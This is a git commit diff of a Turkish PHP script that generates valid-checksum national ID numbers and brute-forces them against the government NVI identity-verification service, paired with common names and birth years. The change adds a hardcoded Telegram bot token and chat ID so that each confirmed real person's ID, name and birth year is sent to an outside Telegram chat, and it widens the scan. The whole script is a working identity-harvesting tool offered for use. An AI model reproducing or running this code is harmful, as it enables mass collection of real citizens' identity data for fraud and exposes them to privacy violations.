462e88f20e73939595d5bdb079ad4d20cc7e1510
hodulayahweh-wq <hodulayahweh@gmail.com>
2026-01-14 21:02:19 +0300

    Update nvi_test.php

--- nvi_test.php
+++ nvi_test.php
@@ -2,6 +2,16 @@
 header('Content-Type: text/html; charset=utf-8');
 set_time_limit(0);
 
+// --- TELEGRAM AYARLARI ---
+$botToken = "8405664089:AAEJi8ipuYWCeKpRSFFYGINACt4Sej1xeNI"; // BotFather'dan aldığın kod
+$chatId = "8258235296";     // UserInfoBot'tan aldığın ID
+
+function telegramGonder($mesaj, $token, $id) {
+    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$id&text=" . urlencode($mesaj);
+    @file_get_contents($url);
+}
+
+// --- TC ÜRETİCİ ---
 function tcUret() {
     $digits = [rand(1, 9)];
     for ($i = 1; $i < 9; $i++) $digits[$i] = rand(0, 9);
@@ -13,6 +23,7 @@ function tcUret() {
     return implode('', $digits) . $h10 . $h11;
 }
 
+// --- NVİ SORGULAYICI (CURL) ---
 function nviSorgula($tc, $ad, $soyad, $yil) {
     $xml = '<?xml version="1.0" encoding="utf-8"?>
     <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
@@ -39,28 +50,29 @@ function nviSorgula($tc, $ad, $soyad, $yil) {
 
     $response = curl_exec($ch);
     curl_close($ch);
-    
     return (strpos($response, '<TCKimlikNoDogrulaResult>true</TCKimlikNoDogrulaResult>') !== false);
 }
 
-// İsim havuzu ve döngü
-$isimler = ["AHMET", "MEHMET", "AYŞE", "FATMA"];
-$soyisimler = ["YILMAZ", "KAYA", "DEMİR"];
+// Havuzlar
+$isimler = ["MEHMET", "MUSTAFA", "AHMET", "ALİ", "HÜSEYİN", "AYŞE", "FATMA", "EMİNE"];
+$soyisimler = ["YILMAZ", "KAYA", "DEMİR", "ŞAHİN", "ÇELİK", "YILDIZ"];
 
-echo "<h2>Render.com Sorgu Başlatıldı</h2>";
+echo "<h2>Tarama Başlatıldı...</h2>";
 
-for($i=0; $i<10; $i++) {
+for($i=0; $i<50; $i++) {
     $tc = tcUret();
     $ad = $isimler[array_rand($isimler)];
     $soyad = $soyisimler[array_rand($soyisimler)];
-    $yil = rand(1980, 2005);
+    $yil = rand(1975, 2005);
 
     if (nviSorgula($tc, $ad, $soyad, $yil)) {
-        echo "<b style='color:green;'>BULUNDU: $tc - $ad $soyad</b><br>";
-        file_put_contents("kisiler.txt", "$tc|$ad|$soyad|$yil\n", FILE_APPEND);
+        $msg = "✅ KİŞİ BULUNDU!\nTC: $tc\nİsim: $ad $soyad\nYıl: $yil";
+        telegramGonder($msg, $botToken, $chatId);
+        echo "<b style='color:green;'>BULUNDU: $tc - Telegram'a İletildi!</b><br>";
     } else {
-        echo "Geçersiz: $tc<br>";
+        echo "Denendi: $tc (Olumsuz)<br>";
     }
-    usleep(500000);
+    flush(); // Ekrana anlık basar
+    usleep(300000); // 0.3 sn bekle
 }
 ?>
